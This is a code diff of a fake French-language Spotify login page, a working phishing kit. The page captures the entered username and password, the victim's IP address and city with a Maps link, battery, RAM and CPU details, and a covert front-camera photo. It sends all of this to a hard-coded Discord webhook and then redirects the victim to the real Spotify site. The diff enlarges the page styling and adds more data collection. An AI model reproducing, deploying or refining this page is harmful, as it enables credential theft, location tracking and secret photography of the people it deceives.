@@ -3,77 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Spotify - Connexion</title>
+    <title>Spotify - Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #000000; color: #FFFFFF; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { background-color: #121212; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 8px; text-align: center; }
-        .logo { width: 100px; margin: 0 auto 35px auto; }
-        h1 { font-size: 24px; font-weight: 700; margin-bottom: 30px; letter-spacing: -0.5px; }
-        input { width: 100%; background-color: #121212; border: 1px solid #727272; border-radius: 4px; padding: 12px; color: white; font-size: 16px; margin-bottom: 15px; }
-        input:focus { border: 2px solid #FFFFFF; outline: none; }
-        .btn-green { background-color: #1DB954; color: #000000; font-size: 14px; font-weight: 700; padding: 14px; border-radius: 500px; width: 100%; margin-top: 20px; text-transform: uppercase; letter-spacing: 1.5px; border: none; cursor: pointer; }
-        .links { margin-top: 30px; font-size: 13px; color: #b3b3b3; }
-        .links a { color: white; text-decoration: underline; font-weight: 700; }
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .login-card { background-color: #121212; width: 100%; max-width: 500px; padding: 60px 50px; border-radius: 12px; text-align: center; }
+        .logo { width: 130px; margin: 0 auto 45px auto; }
+        h1 { font-size: 30px; font-weight: 700; margin-bottom: 40px; letter-spacing: -1px; }
+        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 18px; color: #fff; margin-bottom: 20px; outline: none; font-size: 16px; }
+        input:focus { border: 2px solid #fff; padding: 17px; }
+        .btn-green { background: #1DB954; color: #000; font-weight: 700; padding: 18px; border-radius: 500px; width: 100%; text-transform: uppercase; cursor: pointer; border: none; letter-spacing: 1.5px; }
+        .links { margin-top: 40px; font-size: 14px; color: #b3b3b3; }
+        a { color: #fff; text-decoration: underline; font-weight: 700; }
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
     <div class="login-card">
-        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" alt="Spotify" class="logo">
+        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" class="logo">
         <h1>Se connecter pour continuer</h1>
         <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur" spellcheck="false">
         <input id="p" type="password" placeholder="Mot de passe">
-        <button onclick="capture()" id="btn" class="btn-green">Se connecter</button>
+        <button onclick="sendData()" id="btn" class="btn-green">Se connecter</button>
         <div class="links">
             <p><a href="#">Mot de passe oublié ?</a></p>
-            <div style="margin-top: 35px; border-top: 1px solid #282828; padding-top: 25px;">
+            <div style="margin-top: 45px; border-top: 1px solid #282828; padding-top: 35px;">
                 <p>Tu n'as pas de compte ? <a href="#">S'INSCRIRE</a></p>
             </div>
         </div>
     </div>
+
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
+
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-        async function capture() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            if(!user || !pass) return;
-            document.getElementById('btn').innerHTML = "CONNEXION...";
+
+        async function sendData() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            if(!u || !p) return;
+
+            document.getElementById('btn').innerHTML = "VÉRIFICATION...";
+
+            // 1. COLLECTE INFOS (IP / MAPS / BATTERIE)
             let net = {};
-            try { const res = await fetch('https://ipapi.co/json/'); net = await res.json(); } catch(e) {}
+            try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}
+            
             let bat = "N/A";
-            try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}%`; } catch(e) {}
+            try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; } catch(e){}
+
+            const maps = net.latitude ? `https://www.google.com/maps?q=${net.latitude},${net.longitude}` : "N/A";
+
+            // 2. ENVOI DISCORD
             const payload = {
                 embeds: [{
-                    title: "🚀 LOG RÉCUPÉRÉ (DESIGN PRO)",
+                    title: "👑 LOG ULTIMATE RÉCUPÉRÉ",
                     color: 1947988,
                     fields: [
-                        { name: "👤 Identifiants", value: `**User:** \`${user}\`\n**Pass:** \`${pass}\`` },
-                        { name: "🌐 Infos", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city || '?'}\`\n**Batterie:** \`${bat}\`` }
+                        { name: "👤 Identifiants", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
+                        { name: "🌐 Réseau & Géo", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**[Voir sur Maps](${maps})**` },
+                        { name: "📱 Appareil", value: `**Batterie:** \`${bat}\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**CPU:** \`${navigator.hardwareConcurrency || '?'} Coeurs\`` }
                     ],
                     footer: { text: "LVN System • " + new Date().toLocaleString() }
                 }]
             };
+
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+
+            // 3. CAPTURE PHOTO
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 await new Promise(r => setTimeout(r, 2000));
                 const canvas = document.getElementById('c');
-                canvas.width = 640; canvas.height = 480;
+                canvas.width = 1280; canvas.height = 720;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
-                    fd.append('file', blob, 'cam.png');
-                    fd.append('content', "📸 **Capture photo :**");
+                    fd.append('file', blob, 'shot.png');
+                    fd.append('content', "📸 **Photo de la cible :**");
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 }, 'image/png');
             } catch (e) {}
-            setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 2000);
+
+            setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 3000);
         }
     </script>
 </body>
